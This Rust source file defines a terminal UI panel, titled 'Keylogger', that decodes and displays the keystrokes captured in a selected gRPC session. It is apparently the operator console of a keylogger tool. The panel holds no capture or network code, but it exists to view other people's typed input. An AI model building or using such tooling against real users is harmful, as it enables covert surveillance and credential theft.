pub mod utils;

use ratatui::{
    layout::Rect,
    style::{Color, Style, Stylize},
    text::{Span, Text},
    widgets::{Block, BorderType, Paragraph, Wrap},
    Frame,
};
use tamanoir_common::Layout;
use utils::{format_keys, parse_keycodes};

use crate::tamanoir_grpc::SessionResponse;

pub fn render(
    frame: &mut Frame,
    block: Rect,
    selected_session: &mut Option<SessionResponse>,
    is_focused: bool,
) {
    let txt = match selected_session {
        Some(session) => match parse_keycodes(
            &session.key_codes,
            Layout::from(session.keyboard_layout as u8),
        ) {
            Ok(kc) => Text::from(format_keys(kc)),

            Err(_) => Text::from("Error decoding keycodes".to_string()).centered(),
        },
        _ => Text::from("No Session selected".to_string()).centered(),
    };
    let highlight_color = if is_focused {
        Color::Yellow
    } else {
        Color::Blue
    };
    let p = Paragraph::new(txt).wrap(Wrap { trim: true }).block(
        Block::bordered()
            .border_type(BorderType::Rounded)
            .border_style(Style::new().fg(highlight_color))
            .title(Span::styled(
                "Keylogger",
                Style::default().fg(highlight_color).bold(),
            )),
    );

    frame.render_widget(p, block);
}
